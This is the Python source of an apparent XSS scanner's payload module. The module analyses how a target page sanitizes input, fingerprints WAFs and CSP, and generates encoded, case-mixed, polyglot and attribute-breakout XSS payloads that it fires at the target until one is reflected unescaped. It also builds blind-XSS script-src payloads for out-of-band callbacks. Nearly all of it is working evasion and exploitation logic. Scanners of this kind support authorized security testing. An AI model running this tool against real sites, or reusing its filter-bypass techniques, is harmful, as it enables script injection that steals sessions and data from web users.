# payload_strategy.py — ULTRA-MAX (drop-in replacement)
from __future__ import annotations

import logging
import random
import re
import time
import uuid
from dataclasses import dataclass
import json
from typing import Dict, List, Optional, Tuple, Callable
from urllib.parse import quote

from network import make_request
from config import MAX_MUTATIONS_PER_CONTEXT, MAX_SEQUENCE_TOTAL
from config import CONTEXT_MIN_PAYLOADS
from utils import (
    prepare_request_args,
    decode_all,
    get_oob_payload,
    contains_unescaped,
)

logger = logging.getLogger("xsscanner.payload_strategy")


# =========================
# Model sanitasi & konteks
# =========================
@dataclass
class SanitizationProfile:
    tags_stripped: List[str]
    attrs_blocked: List[str]
    chars_encoded: Dict[str, str]
    quote_pref: str                     # "dq" | "sq" | "unquoted" | "unknown"
    context_hints: List[str]            # ["html_tag","attr_quoted","js_string",...]
    waf_fingerprint: Optional[str] = None
    csp_flags: Optional[Dict[str, object]] = None


# =========================
# Engine Bypass Serba Guna
# =========================
class SuperBypassEngine:
    """
    Progressive & context-aware XSS payload engine:
      • Analisis sanitasi & konteks refleksi (quote usage, attr/js/html)
      • Scoring payload berdasar profil, + mutasi multi-encoding
      • Polyglot builder, case-mix, split/concat trick utk URL scheme & JS string
    API dipertahankan agar kompatibel dgn tester.py lama.
    """

    def __init__(self, payloads: Dict[str, List[str]]):
        self.payloads = payloads
        self._waf_plan = None

    def set_waf_plan(self, plan: Dict[str, object] | None):
        self._waf_plan = plan or None

    # ---------- ANALISIS SANITASI ----------
    def analyze_sanitization(self, resp_text: str, probe: str) -> SanitizationProfile:
        t = resp_text or ""
        dec = decode_all(t)

        def _probe_segments(source: str, marker: str, radius: int = 80) -> List[str]:
            if not source:
                return [""]
            if not marker:
                return [source]
            try:
                positions = [m.start() for m in re.finditer(re.escape(marker), source)]
            except Exception:
                positions = []
            if not positions:
                return [source]
            segments: List[str] = []
            for idx in positions:
                start = max(0, idx - radius)
                end = min(len(source), idx + len(marker) + radius)
                segments.append(source[start:end])
            return segments or [source]

        raw_segments = _probe_segments(t, probe)
        decoded_segments = [decode_all(seg) for seg in raw_segments]

        # 1) karakter yg di-encode → peta char->bentuk
        encoded_map: Dict[str, str] = {}
        candidates = {
            "<": ["&lt;", "&#60;", "&#x3c;"],
            ">": ["&gt;", "&#62;", "&#x3e;"],
            '"': ["&quot;", "&#34;", "&#x22;"],
            "'": ["&#39;", "&#x27;"],
            "/": ["&#47;", "&#x2f;"],
            "=": ["&#61;", "&#x3d;"],
            "`": ["&#96;", "&#x60;"],
        }
        for ch, forms in candidates.items():
            for raw_seg, dec_seg in zip(raw_segments, decoded_segments):
                lower = raw_seg.lower()
                hit = next((f for f in forms if f.lower() in lower), None)
                if hit:
                    encoded_map.setdefault(ch, hit)
                    break
                if ch not in raw_seg and ch in dec_seg:
                    encoded_map.setdefault(ch, forms[0])
                    break

        # 2) deteksi tag yg disaring (script/svg/iframe/img/details)
        tags = ["script", "svg", "iframe", "img", "details"]
        tags_stripped = []
        for tag in tags:
            for raw_seg in raw_segments:
                if re.search(fr"&lt;{tag}\b", raw_seg, re.I) and not re.search(fr"<{tag}\b", raw_seg, re.I):
                    tags_stripped.append(tag)
                    break

        # 3) deteksi atribut yang diblok (onload/onclick/onerror/style/…)
        attrs = ["onload", "onclick", "onerror", "onmouseover", "style", "srcdoc"]
        attrs_blocked = []
        for a in attrs:
            # muncul sebagai entity tapi tidak sebagai atribut nyata
            for raw_seg in raw_segments:
                ent_hit = re.search(fr"&[#\w]+{a}", raw_seg, re.I)
                real_hit = re.search(fr"\b{a}\s*=", raw_seg, re.I)
                if ent_hit and not real_hit:
                    attrs_blocked.append(a)
                    break

        # 4) konteks refleksi PROBE
        hints: List[str] = []
        esc = re.escape(probe)

        def _match(pattern: str, *, decoded: bool = False, flags: int = re.I | re.S) -> bool:
            targets = decoded_segments if decoded else raw_segments
            return any(re.search(pattern, segment, flags) for segment in targets)

        # html tag content
        if _match(rf">{esc}<") or _match(rf">{esc}<", decoded=True):
            hints.append("html_tag")

        # di dalam <script>…</script>
        if _match(rf"<script[^>]*>[^<]*{esc}[^<]*</script>", decoded=True):
            hints.append("script_tag")
            hints.append("js_string")  # kemungkinan besar string/expr

        # atribut (quoted/unquoted)
        if _match(rf'\b[\w:-]+\s*=\s*"{esc}"', decoded=True):
            hints.append("attr_quoted")
        if _match(rf"\b[\w:-]+\s*=\s*'{esc}'", decoded=True):
            hints.append("attr_quoted")
        if _match(rf"\b[\w:-]+\s*=\s*{esc}(?=[\s>])", decoded=True):
            hints.append("attr_unquoted")

        # data-attribute/srcdoc
        if _match(rf"\bdata-[\w-]+\s*=\s*(['\"])?.*{esc}.*\1?", decoded=True):
            hints.append("data_attribute")
        if _match(rf"\bsrcdoc\s*=\s*(['\"]).*{esc}.*\1", decoded=True):
            hints.append("srcdoc_attr")

        # js string literal
        if _match(rf'["\']{esc}["\']', decoded=True):
            hints.append("js_string")

        # url scheme
        if _match(rf"(javascript|data|vbscript)\s*:\s*{esc}", decoded=True):
            hints.append("uri_scheme")

        # css url/expression
        if _match(rf"url\([^)]*{esc}[^)]*\)", decoded=True):
            hints.append("css_url")
        if _match(rf"expression\([^)]*{esc}[^)]*\)", decoded=True):
            hints.append("css_expression")

        # event handler
        if _match(rf"\bon[a-z]+\s*=\s*(['\"])?{esc}\1?", decoded=True):
            hints.append("event_handler")

        # moustache / handlebars style
        moustache_pat = r"\{\{\s*" + esc + r"\s*\}\}"
        moustache_raw_pat = r"\{\{\{\s*" + esc + r"\s*\}\}\}"
        if _match(moustache_pat, decoded=True) or _match(moustache_raw_pat, decoded=True):
            hints.append("template_engine")

        # JSON key/value hints
        if _match(rf"\"[^\"]*\"\s*:\s*\"{esc}\"", decoded=True):
            hints.append("js_string")

        # template engine/framework hints (Angular/Vue/Handlebars)
        if re.search(r"<script[^>]+type=\"text/x-handlebars-template\"", dec, re.I) or \
           re.search(r"\bng-[\w-]+\b", dec, re.I) or \
           re.search(r"\bv-[\w-]+\b|@click=|:\w+=", dec, re.I):
            hints.append("template_engine")

        # 5) deteksi preferensi quote (mengarahkan attribute breakout)
        quote_pref = "unknown"
        if "attr_quoted" in hints:
            # pilih jenis kutip yang dominan di sekitar probe
            dq = _match(rf'="\s*{esc}\s*"', decoded=True, flags=re.I)
            sq = _match(rf"='\s*{esc}\s*'", decoded=True, flags=re.I)
            if dq and not sq:
                quote_pref = "dq"
            elif sq and not dq:
                quote_pref = "sq"
            else:
                quote_pref = "dq"
        elif "attr_unquoted" in hints:
            quote_pref = "unquoted"

        # 6) fingerprint WAF seadanya (indikator kecil dari body)
        waf_fp = None
        waf_markers = [
            ("cloudflare", r"cloudflare"),
            ("imperva", r"incapsula|imperva"),
            ("modsecurity", r"mod_security|modsecurity"),
            ("akamai", r"akamai"),
        ]
        low = t.lower()
        for name, pat in waf_markers:
            if re.search(pat, low):
                waf_fp = name
                break

        # 7) CSP flags via meta (best-effort)
        try:
            from utils import extract_meta_csp, parse_csp, derive_csp_flags
            meta_csp = extract_meta_csp(resp_text or "")
            csp_flags = derive_csp_flags(parse_csp(meta_csp)) if meta_csp else None
        except Exception:
            csp_flags = None

        return SanitizationProfile(
            tags_stripped=tags_stripped,
            attrs_blocked=attrs_blocked,
            chars_encoded=encoded_map,
            quote_pref=quote_pref,
            context_hints=list(dict.fromkeys(hints)),
            waf_fingerprint=waf_fp,
            csp_flags=csp_flags,
        )

    # ---------- GENERATOR VARIAN ----------
    def _base_variants(self, payload: str) -> List[str]:
        """Varian encoding umum & case-mix tanpa konteks."""
        out = {payload}

        # HTML entities (khusus tanda sudut & kutip)
        ent = (
            payload.replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;")
        )
        out.add(ent)
        # Decimal entities
        ent_dec = (
            payload.replace("<", "&#60;")
            .replace(">", "&#62;")
            .replace('"', "&#34;")
            .replace("'", "&#39;")
        )
        out.add(ent_dec)
        # No-semicolon entities (parser-tolerant)
        ent_nosemi = (
            payload.replace("<", "&#x3c")
            .replace(">", "&#x3e")
            .replace('"', "&#x22")
            .replace("'", "&#x27")
        )
        out.add(ent_nosemi)

        # Percent & double percent
        p1 = quote(payload)
        out.update({p1, quote(p1)})

        # Unicode escape untuk tanda sudut (aman utk banyak filter HTML)
        out.add(payload.replace("<", "\\u003c").replace(">", "\\u003e"))
        # JS hex escapes
        out.add(payload.replace("<", "\\x3c").replace(">", "\\x3e"))

        # Case-mix sederhana
        out.add("".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))

        return list(out)

    def _scheme_mutations(self, s: str) -> List[str]:
        """Mutasi untuk `javascript:` / `data:` (bypass sederhana)."""
        variants = {s}
        v = s

        # sisipkan whitespace / newline / tab
        variants.add(v.replace("javascript:", "java\nscript:"))
        variants.add(v.replace("javascript:", "java\tscript:"))
        variants.add(v.replace("javascript:", "java\\x73cript:"))  # x73 = 's'
        variants.add(v.replace("javascript:", "javasc\u0063ript:"))  # unicode mix
        variants.add(v.replace("javascript:", "ja\u0000vascript:"))  # null split (kadang useless, tetap dicoba)

        # case mixing
        variants.add(v.replace("javascript:", "JaVaScRiPt:"))

        # 'data:' tricks
        variants.add(v.replace("data:", "da\\x74a:"))
        variants.add(v.replace("data:", "da\u0074a:"))

        return list(variants)

    def _inject_whitespace_comments(self, payload: str) -> List[str]:
        """Variasi kecil whitespace/comment untuk mem-bypass parser naif."""
        out = set()
        p = payload
        try:
            out.add(p.replace("<svg", "<svg \n"))
            out.add(p.replace(" on", " /**/on"))
            out.add(p.replace("onload=", "onload = "))
            out.add(p.replace("onerror=", "onerror = "))
            out.add(p.replace("<script", "<scr"+"ipt"))
            out.add(p.replace("javascript:", "java\ns\ncript:"))
        except Exception:
            pass
        return list(out)

    def _controlled_mutate(self, payload: str, prof: SanitizationProfile, limit: int = MAX_MUTATIONS_PER_CONTEXT) -> List[str]:
        """
        Mutasi ringan & terkontrol: kombinasi kecil entity/percent/unicode/jshex + whitespace/comment.
        """
        cand = set()
        # Base encodings dari utils.generate_encoding_variants via caller (tester) — di sini pakai internal
        cand.update(self._base_variants(payload))
        cand.update(self._inject_whitespace_comments(payload))
        # Konteks tambahan
        for v in list(cand):
            cand.update(self._encode_variants_contextual(v, prof))
        # Dedupe dan batasi
        dedup = list(dict.fromkeys(cand))
        return dedup[: max(1, int(limit))]

    def _wrap_attr_breakout(self, core: str, quote_pref: str) -> List[str]:
        """Bangun payload breakout untuk konteks atribut."""
        v = set()
        if quote_pref in ("dq", "unknown"):
            v.update({
                f'">{core}"',
                f'" autofocus onfocus={core} x="',
                f'" onmouseover={core} x="',
                f'" onerror={core} x="',
            })
        if quote_pref in ("sq", "unknown"):
            v.update({
                f"'>{core}'",
                f"' autofocus onfocus={core} x='",
                f"' onmouseover={core} x='",
                f"' onerror={core} x='",
            })
        if quote_pref == "unquoted":
            v.update({
                f">{core}",
                f" onmouseover={core} ",
                f" onerror={core} ",
            })
        return list(v)

    def _polyglotize(self, payload: str) -> List[str]:
        """Buat beberapa polyglot sejenis untuk memperluas attack surface."""
        return list({
            f"\"--></style>{payload}<!--",
            f"'-->{payload}<!--'",
            f"<!-->{payload}",
            f"';{payload}//",
            f'";{payload}//',
        })

    def _encode_variants_contextual(self, payload: str, prof: SanitizationProfile) -> List[str]:
        """Pilih encoding/varian berdasar profil (chars filtered, WAF, dll)."""
        variants = set(self._base_variants(payload))

        # Jika kutip tertentu difilter → tonjolkan varian yg hindari kutip tsb
        if '"' in prof.chars_encoded:
            variants.update(v.replace('"', "&#34;") for v in list(variants))
        if "'" in prof.chars_encoded:
            variants.update(v.replace("'", "&#39;") for v in list(variants))

        # Jika < atau > difilter → gunakan unicode/hex lebih agresif
        if ("<" in prof.chars_encoded) or (">" in prof.chars_encoded):
            variants.add(payload.replace("<", "\\u003c").replace(">", "\\u003e"))
            variants.add(payload.replace("<", "\\x3c").replace(">", "\\x3e"))

        # Skema URL → tambahkan mutasi skema
        if payload.startswith(("javascript:", "data:")):
            for v in list(variants):
                variants.update(self._scheme_mutations(v))

        return list(variants)

    # ---------- PEMBANGUN SEKUENS ----------
    def generate_sequence(self, profile: SanitizationProfile) -> List[str]:
        seq: List[str] = []

        # Prioritaskan berdasarkan hint konteks
        hints = set(profile.context_hints)

        def push(cat: str):
            seq.extend(self.payloads.get(cat, []))

        # 0) Context-aware minimal seeds dari config (paling awal, dengan mutasi ringan)
        starters: List[str] = []
        if "html_tag" in hints:
            starters += CONTEXT_MIN_PAYLOADS.get("html_tag", [])
            # SVG seeds sering efektif di HTML context
            starters += CONTEXT_MIN_PAYLOADS.get("svg", [])
        if "attr_unquoted" in hints:
            starters += CONTEXT_MIN_PAYLOADS.get("attr_unquoted", [])
        if "attr_quoted" in hints:
            # pilih berdasar preferensi kutip
            if profile.quote_pref == "dq":
                starters += CONTEXT_MIN_PAYLOADS.get("attr_dq", [])
            elif profile.quote_pref == "sq":
                starters += CONTEXT_MIN_PAYLOADS.get("attr_sq", [])
            else:
                starters += CONTEXT_MIN_PAYLOADS.get("attr_dq", [])
                starters += CONTEXT_MIN_PAYLOADS.get("attr_sq", [])
        if "js_string" in hints:
            starters += CONTEXT_MIN_PAYLOADS.get("js_string_dq", [])
            starters += CONTEXT_MIN_PAYLOADS.get("js_string_sq", [])
        if "uri_scheme" in hints:
            starters += CONTEXT_MIN_PAYLOADS.get("uri_scheme", [])
        if "css_url" in hints:
            starters += CONTEXT_MIN_PAYLOADS.get("css_url", [])
        if "css_expression" in hints:
            starters += CONTEXT_MIN_PAYLOADS.get("css_expression", [])
        if "event_handler" in hints:
            starters += CONTEXT_MIN_PAYLOADS.get("event_handler", [])
        # Polyglot kecil bila relevan
        starters += CONTEXT_MIN_PAYLOADS.get("polyglot", [])

        # Mutasi ringan untuk starters
        starters_mut: List[str] = []
        for s in starters:
            starters_mut.extend(self._controlled_mutate(s, profile, limit=8))

        # 1) script/js string
        if "script_tag" in hints or "js_string" in hints:
            push("js_string_breakout_dq")
            push("js_string_breakout_sq")
            push("polyglot")  # sering berguna di inline script

        # 2) atribut
        if "attr_quoted" in hints or "attr_unquoted" in hints or "data_attribute" in hints or "srcdoc_attr" in hints:
            push("attribute_breakout_dq")
            push("attribute_breakout_sq")

        # 3) html tag & polyglot
        if "html_tag" in hints or not hints:
            push("html_tag_injection")
            push("polyglot")

        # 4) URL scheme / CSS
        if "uri_scheme" in hints:
            push("url_based")
        if "css_url" in hints or "css_expression" in hints:
            push("css_injection")
        # Template engines
        if "template_engine" in hints:
            push("template_engine")

        # 5) event handler
        if "event_handler" in hints:
            push("event_handler")

        # 6) DOM clobbering / sinks umum
        push("dom_clobbering")

        # 7) Encodings berat
        push("encoding")

        # Filter kasar berdasar tag/attr blocked
        filtered_seq = []
        for p in seq:
            if any(f"<{t}" in p for t in profile.tags_stripped):
                continue
            if any(a in p for a in profile.attrs_blocked):
                continue
            filtered_seq.append(p)

        # Expand + contextual encode + polyglot fill
        expanded: List[str] = []
        # Awali dengan starters yang sudah di-mutate terbatas
        expanded.extend(starters_mut[: MAX_MUTATIONS_PER_CONTEXT])
        for base in filtered_seq:
            expanded.extend(self._encode_variants_contextual(base, profile))
            # polyglot tambahan bila attr/js string dominan
            if any(h in hints for h in ("attr_quoted", "attr_unquoted", "js_string")):
                for pg in self._polyglotize(base):
                    expanded.extend(self._encode_variants_contextual(pg, profile))

        # Tambah breakout khusus atribut berdasar quote_pref
        if any(h in hints for h in ("attr_quoted", "attr_unquoted")):
            for core in ["alert(1)", "prompt(document.domain)"]:
                for br in self._wrap_attr_breakout(core, profile.quote_pref):
                    expanded.extend(self._encode_variants_contextual(br, profile))

        # Scoring: penalti utk karakter yg ter-encode & elemen yg disaring
        def score(pl: str) -> int:
            s = 0
            # konteks bonus
            if "script_tag" in hints and ("</script>" in pl or "<script" in pl):
                s += 6
            if "attr_quoted" in hints and any(k in pl for k in ('"', "'")):
                s += 4
            if "attr_unquoted" in hints and ('"' not in pl and "'" not in pl):
                s += 4
            if "js_string" in hints and any(tok in pl for tok in ("';", '";', "`;")):
                s += 3
            # penalti bila mengandung karakter yg difilter
            for ch in profile.chars_encoded:
                if ch in pl:
                    s -= 2
            # penalti jika gunakan tag/attr yg diketahui diblok
            for tag in profile.tags_stripped:
                if f"<{tag}" in pl:
                    s -= 5
            for a in profile.attrs_blocked:
                if a in pl:
                    s -= 3
            # noise kecil
            s += random.randint(-2, 2)
            return s

        # Dedupe + sort
        dedup = list(dict.fromkeys(expanded))
        dedup.sort(key=score, reverse=True)

        # CSP gating: drop payloads that will trivially be blocked
        def _allow(pl: str) -> bool:
            flags = profile.csp_flags or {}
            if not flags:
                return True
            s = (pl or "").lower()
            # Inline script & event handlers blocked if no_inline_script
            if flags.get("no_inline_script"):
                if "<script" in s:
                    return False
                if " on" in s or "onload" in s or "onerror" in s or "onclick" in s:
                    return False
                if "javascript:" in s:
                    return False
            # data: script disallowed
            if not flags.get("allow_data_script") and "data:text" in s:
                return False
            # CSS inline likely blocked by strict style-src
            if flags.get("style_no_inline") and ("<style" in s or "style=" in s or "expression(" in s):
                return False
            return True

        gated = [p for p in dedup if _allow(p)]

        # Apply WAF bypass plan (lightweight reordering/filtering)
        plan = self._waf_plan or {}
        if plan:
            tmp = []
            avoid = []
            for p in gated:
                s = (p or "").lower()
                if plan.get('no_javascript_url') and 'javascript:' in s:
                    avoid.append(p); continue
                if plan.get('reduce_inline_handlers') and (' on' in s or 'onerror' in s or 'onclick' in s):
                    avoid.append(p); continue
                if plan.get('short_payloads') and len(p) > 120:
                    avoid.append(p); continue
                tmp.append(p)
            # Prioritize minimal attribute/context payloads if requested
            if plan.get('prefer_minimal_attr'):
                tmp.sort(key=lambda x: ((' on' in (x or '')) or ('"' in (x or '') or "'" in (x or '')), len(x)))
            gated = tmp + avoid  # still keep avoid at tail as last resort

        # Batasi agar tidak kebablasan (top-N)
        return gated[: max(1, int(MAX_SEQUENCE_TOTAL))]

    # ---------- EKSEKUSI PROGRESIF ----------
    def test_progressive(
        self,
        base_url: str,
        method: str,
        param_name: str,
        template: Dict[str, str],
        is_form: bool,
        initial_response_text: Optional[str] = None,
        probe: Optional[str] = None,
        progress_cb: Optional[Callable[[int], None]] = None,
    ) -> Optional[Dict]:
        """
        1) Analisis sanitasi & konteks berdasarkan response awal/probe
        2) Generate urutan payload (scored)
        3) Kirim satu per satu (stop di hit pertama yg reflected)
        """
        # 1) persiapkan response dasar utk analisis
        if initial_response_text is None:
            probe = probe or f"SUPERPROBE{int(time.time())}"
            tpl = dict(template); tpl[param_name] = probe
            req_url, _, body = prepare_request_args(base_url, method, tpl, is_form)
            if method.upper() == "GET" and not is_form:
                resp = make_request(req_url)
            else:
                headers = None
                data = body
                if method.upper() == "POST" and not is_form:
                    headers = {"Content-Type": "application/json"}
                    data = json.dumps(body) if isinstance(body, dict) else body
                resp = make_request(req_url, method, data=data, headers=headers)
            if not (resp and contains_unescaped(resp.text or "", probe)):
                logger.info(f"[probe] no reflection for '{param_name}'")
                return None
            response_text = resp.text
        else:
            response_text = initial_response_text or ""

        # 2) analisis profil
        profile = self.analyze_sanitization(response_text, probe or "")
        logger.debug(f"[profile] {profile}")

        # 3) generate & kirim
        for idx, payload in enumerate(self.generate_sequence(profile), start=1):
            tpl = dict(template); tpl[param_name] = payload
            url2, _, body2 = prepare_request_args(base_url, method, tpl, is_form)

            if method.upper() == "GET" and not is_form:
                r2 = make_request(url2)
            else:
                headers = None
                data = body2
                if method.upper() == "POST" and not is_form:
                    headers = {"Content-Type": "application/json"}
                    data = json.dumps(body2) if isinstance(body2, dict) else body2
                r2 = make_request(url2, method, data=data, headers=headers)

            if not r2:
                if progress_cb and (idx % 10 == 0):
                    try: progress_cb(idx)
                    except Exception: pass
                continue

            body = r2.text or ""
            if contains_unescaped(body, payload):
                logger.info(f"[bypass] payload={payload}")
                return {"url": r2.url, "parameter": param_name, "payload": payload}
            else:
                if progress_cb and (idx % 10 == 0):
                    try: progress_cb(idx)
                    except Exception: pass

        logger.info(f"[fail] no bypass for '{param_name}'")
        return None

    # ---------- Blind-XSS ----------
    def generate_oob_payload(self) -> Tuple[str, str]:
        """
        Menghasilkan token & payload <script src="…"> untuk Blind XSS.
        """
        token = uuid.uuid4().hex
        return token, get_oob_payload(token)
